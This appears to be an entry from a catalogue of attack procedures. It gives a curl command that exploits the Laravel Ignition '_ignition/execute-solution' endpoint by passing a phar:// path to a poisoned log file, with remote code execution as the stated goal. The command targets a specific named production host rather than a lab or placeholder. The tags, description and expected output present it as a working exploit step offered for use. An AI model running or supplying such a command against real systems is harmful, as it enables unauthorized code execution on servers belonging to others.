---
data: >-
  curl -XPOST -H'Content-Type: application/json' -d
  '{"solution":"Facade\\\Ignition\\\Solutions\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":"phar://../storage/logs/laravel.log"},}'
  https://mpos.mtn.co.sz/_ignition/execute-solution
tags:
  - rce
  - phar
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:17.538Z'
id: f6f61125-c896-4507-ba40-958b0392351d
verified: false
validated: true
submitted: true
---
# curl-phar-execution-attempt

## Command

```bash
curl -XPOST -H'Content-Type: application/json' -d '{"solution":"Facade\\\Ignition\\\Solutions\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":"phar://../storage/logs/laravel.log"},}' https://mpos.mtn.co.sz/_ignition/execute-solution
```

## Description

Attempts code execution by treating the poisoned log as a PHAR archive via phar:// wrapper.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| viewFile | phar:// path to log | Yes |

## Examples

### Basic Usage

As above for deserialization.

## Expected Output

Code execution in response if successful.

## Related

- [[Related Procedure: Attempt-RCE-via-Ignition-Log-Poisoning-with-Curl]]
